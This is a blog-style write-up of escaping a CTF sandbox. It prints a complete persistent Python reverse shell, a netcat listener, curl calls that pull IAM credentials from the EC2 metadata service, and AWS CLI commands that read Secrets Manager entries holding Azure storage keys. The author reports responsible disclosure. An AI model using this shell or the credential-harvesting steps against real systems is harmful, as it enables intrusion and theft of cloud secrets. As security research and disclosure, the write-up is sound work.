## ***Amazon AWS EC2 to Azure Blob Storage***

Hi all, its been a while. This is a walk through of a security issue I found in a real environment on a CTF challenge environment I was exploring. This issue has been reported and fixes by the company hosting it, who'll stay anonymous. Long story short, AWS Keys -> Azure Blob Storage.

This competition, was designed for us to upload a python script to a host, which then attacks another vulnerable box with our script and attempts to steal data within a time limit.

My first step, as always was to pop a shell on the system I was testing from.

```python
#!/usr/bin/env python3

import socket
import subprocess
import os
import sys
import time
import threading
import signal

def connect_back():
    # Target IP and port for reverse connection
    TARGET_IP = "<censored>"
    TARGET_PORT = <censored>
    
    # Make this process independent from parent
    try:
        # Ignore common termination signals
        signal.signal(signal.SIGTERM, signal.SIG_IGN)
        signal.signal(signal.SIGINT, signal.SIG_IGN)
        if hasattr(signal, 'SIGHUP'):
            signal.signal(signal.SIGHUP, signal.SIG_IGN)
    except:
        pass
    
    # Retry connection loop for persistence
    retry_count = 0
    max_retries = 100
    
    while retry_count < max_retries:
        try:
            # Create socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # Send initial connection message with cross-platform hostname
            try:
                hostname = socket.gethostname()
            except:
                hostname = "unknown"
            s.send(b"[+] Reverse shell connected from " + hostname.encode() + b" (attempt " + str(retry_count + 1).encode() + b")\n")
            
            # Reset retry count on successful connection
            retry_count = 0
            
            while True:
                # Receive command from server
                command = s.recv(1024).decode().strip()
                
                if command.lower() == 'exit':
                    return  # Only exit on explicit command
                elif command.lower() == 'quit':
                    return  # Only exit on explicit command
                elif command == '':
                    continue
                
                try:
                    # Execute command and capture output
                    if command.startswith('cd '):
                        # Handle directory changes
                        path = command[3:].strip()
                        os.chdir(path)
                        output = f"Changed directory to {os.getcwd()}\n"
                    else:
                        # Execute other commands
                        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
                        output = result.stdout + result.stderr
                        
                    if not output:
                        output = "Command executed successfully (no output)\n"
                        
                except subprocess.TimeoutExpired:
                    output = "Command timed out\n"
                except Exception as e:
                    output = f"Error executing command: {str(e)}\n"
                
                # Send output back to server
                try:
                    s.send(output.encode())
                except:
                    break  # Connection lost, retry
                    
        except Exception as e:
            # Connection failed, increment retry and wait before retrying
            retry_count += 1
            if retry_count < max_retries:
                # Exponential backoff with some randomization
                wait_time = min(30, 2 ** min(retry_count, 5)) + (retry_count % 3)
                time.sleep(wait_time)
        finally:
            try:
                s.close()
            except:
                pass


```

And lets listen...
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp <port>
listening on [any] <port> ...
connect to [<local_ip>] from (UNKNOWN) [<EC2 IP>] 49743
[+] Reverse shell connected from EC2AMAZ-<HOSTNAME> (attempt 1)

```

Alright lets go, pretty easy. Lets see what permissions our instance has.

Grab credentials on the box using Amazon API.

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
<censored-account>
```

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<censored-account> 
{ "Code" : "Success", "LastUpdated" : "<Censored Date>", "Type" : "AWS-HMAC", "AccessKeyId" : "<KeyID>", "SecretAccessKey" : "<AccessKey", "Token" : "<TokenID>", "Expiration" : "<Censored Date>" }
```

Now, we can use the AWS CLI locally, to continue testing our privileges.

Set AWS Tokens using AWS CLI
```
export AWS_ACCESS_KEY_ID="NEW_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="NEW_SECRET_KEY"
export AWS_SESSION_TOKEN="NEW_SESSION_TOKEN"
```

Check on my machine that credentials worked.
```bash
aws sts get-caller-identity 
{ "UserId": "<censored-id>:<censored-instance>", "Account": "<censored-account>", "Arn": "arn:aws:sts::<account-id>:assumed-role/<censored-account>/<censored-instance" }
```

Now at this point, I tried some IAM stuff, looking for machines I had access to with SSM, but this ultimately failed. I wanted shell on the target box, that was my golden goose at this point. After a bit of researching and try different commands I stumbled on something interesting.

AWS Secrets Manager.

```bash
aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-2:<censored>:secret:<Censored>-<Censored>",
            "Name": "<Censored>-credentials",
            "LastChangedDate": "2024-07-26T14:54:43.432000+09:30",
            "LastAccessedDate": "2025-08-28T09:30:00+09:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "<censored>": [
                    "AWSPREVIOUS"
                ],
                "<censored>": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2024-07-24T16:57:07.179000+09:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-2:<censored>:secret:<Censored>-Keys-<Censored>",
            "Name": "<Censored>-Keys",
            "Description": "EC2 secrets for <Censored> <censored>",
            "LastChangedDate": "2025-05-29T14:46:07.967000+09:30",
            "LastAccessedDate": "2025-08-28T09:30:00+09:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "<censored>": [
                    "AWSPREVIOUS"
                ],
                "<censored>": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2025-05-29T13:18:20.031000+09:30"
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-2:<censored>:secret:<censored>",
            "Name": "<Censored>-keys",
            "Description": "Keys used for the Cyber Security competition in <Censored>.",
            "LastChangedDate": "2025-08-19T09:14:48.723000+09:30",
            "LastAccessedDate": "2025-08-28T09:30:00+09:30",
            "Tags": [],
            "SecretVersionsToStages": {
                "<censored>": [
                    "AWSCURRENT"
                ],
                "<censored>": [
                    "AWSPREVIOUS"
                ]
            },
            "CreatedDate": "2025-06-24T20:19:44.494000+09:30"
        }
    ]
}

```


Uhhh, what the hell? Why is there Keys used for the competition here. That doesn't make any sense. I have been going about this the wrong way?

Let me check whats in these secrets.

```
lloyd@lloydlaptop:~$ aws secretsmanager get-secret-value --secret-id <censored>
{
    "ARN": "arn:aws:secretsmanager:us-east-2:<censored>:secret:<censored>-Keys-<censored>",
    "Name": "<censored>-Keys",
    "VersionId": "<censored>",
    "SecretString": "{\"Microsoft.ServiceBus.ConnectionString\":\"Endpoint=sb://<censored>.servicebus.windows.net/;SharedAccessKeyName=RootManageSharedAccessKey;SharedAccessKey=<censored>\",\"<censored>StorageAccountConnectionString\":\"DefaultEndpointsProtocol=https;AccountName=<censored>;AccountKey=<censored>;EndpointSuffix=core.windows.net\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-05-29T14:46:07.962000+09:30"
}

```


```
lloyd@lloydlaptop:~$ aws secretsmanager get-secret-value --secret-id <censored>
{
    "ARN": "arn:aws:secretsmanager:us-east-2:<censored>:secret:<censored>-keys",
    "Name": "<censored>-keys",
    "VersionId": "<censored>",
    "SecretString": "{\"subnet\":\"<censored-subnet>\",\"security-group\":\"sg-<censored-group>\",\"private-key-pair-name\":\"<censored>-key\",\"aws-access-key\":\"<censored>\",\"ami-id\":\"ami-<censored>\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-08-19T09:14:48.718000+09:30"
}

```


Oh *shit*. These are Azure Blob Storage keys for **the competition site**. This is not what I wanted.

This had everything, user submissions, test data, **database backups with service account hashes**, **Azure Key Vaults**. This is not what I was intending to do.

One responsible disclosure later, and it appears this method has been patched. This is a great example of scoping is really important when hosting competition and an even better example of why you should get pentested more often. 